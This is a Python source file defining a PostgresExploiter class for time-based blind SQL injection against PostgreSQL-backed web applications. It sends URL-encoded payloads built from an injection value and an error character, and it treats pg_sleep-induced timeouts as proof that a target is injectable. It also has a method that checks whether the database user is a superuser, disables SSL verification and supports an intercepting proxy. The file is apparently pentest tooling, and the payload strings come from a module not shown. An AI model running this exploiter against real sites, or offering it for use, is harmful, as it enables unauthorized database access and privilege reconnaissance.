"""
Author: Aleksa Zatezalo
Date: January 2025
Description: File that generates SQLi payloads
"""

import requests
import time
from typing import List, Dict, Optional, Union
from .payloads import PostgresPayloadGenerator
from ..encoders.http.postgres_encoder import PostgresHTTPEncoder


class PostgresExploiter:
    def __init__(
        self,
        sleep_time: int = 3,
        proxy: Optional[Dict[str, str]] = None,
        error_param: str = ";",
    ):
        """
        Initialize the PostgreSQL exploiter.

        Args:
            sleep_time (int): Time in seconds to use for pg_sleep delays
            proxy (dict, optional): Proxy configuration e.g., {'http': 'http://127.0.0.1:8080'}
            error_param (str): Error parameter to use (e.g., ', ", ;)
        """
        self.payload_gen = PostgresPayloadGenerator()
        self.payload_gen.set_sleep_time(sleep_time)
        self.sleep_time = sleep_time
        self.timeout = sleep_time + 2
        self.encoder = PostgresHTTPEncoder()
        self.proxy = proxy
        self.verify_ssl = False
        self.error_param = error_param
        self.injection_value = "1"

    def set_proxy(self, proxy: Dict[str, str]) -> None:
        """
        Set proxy for HTTP requests.

        Args:
            proxy (dict): Proxy configuration dictionary
        """
        self.proxy = proxy
        self.verify_ssl = False

    def remove_proxy(self) -> None:
        """Remove proxy configuration and restore SSL verification"""
        self.proxy = None
        self.verify_ssl = True

    def set_error_param(self, error_param: str) -> None:
        """
        Set the error parameter to use in payloads.

        Args:
            error_param (str): Error parameter (e.g., ', ", ;)
        """
        self.error_param = error_param

    def set_injection_value(self, value: str) -> None:
        """
        Set the value to use before the error parameter.

        Args:
            value (str): Value to use (e.g., 1, 0, etc.)
        """
        self.injection_value = value

    def _send_request(self, url: str, payload: str) -> bool:
        """
        Send request and determine if delay occurred.

        Args:
            url (str): Target URL
            payload (str): SQL injection payload

        Returns:
            bool: True if delay was detected, False otherwise
        """
        try:
            full_payload = f"{self.injection_value}{self.error_param}{payload}"
            encoded_payload = self.encoder.encode(full_payload)

            start_time = time.time()
            requests.get(
                url + encoded_payload,
                timeout=self.timeout,
                proxies=self.proxy,
                verify=self.verify_ssl,
                allow_redirects=False,
            )
            return False
        except requests.Timeout:
            end_time = time.time()
            return (end_time - start_time) >= self.sleep_time
        except requests.RequestException as e:
            print(f"Request error: {str(e)}")
            return False

    def test_injection(self, url: str) -> bool:
        """
        Test if target is vulnerable to SQL injection.
        Args:
            url (str): Target URL to test
        Returns:
            bool: True if target is vulnerable, False otherwise
        """

        payload = self.payload_gen.test_payload()
        return self._send_request(url, payload)

    def is_superuser(self, url: str) -> bool:
        """
        Check if the current database user is a superuser.

        Args:
            url (str): Target URL vulnerable to SQL injection

        Returns:
            bool: True if current user is superuser, False otherwise
        """
        payload = self.payload_gen.superuser_check_payload()
        return self._send_request(url, payload)
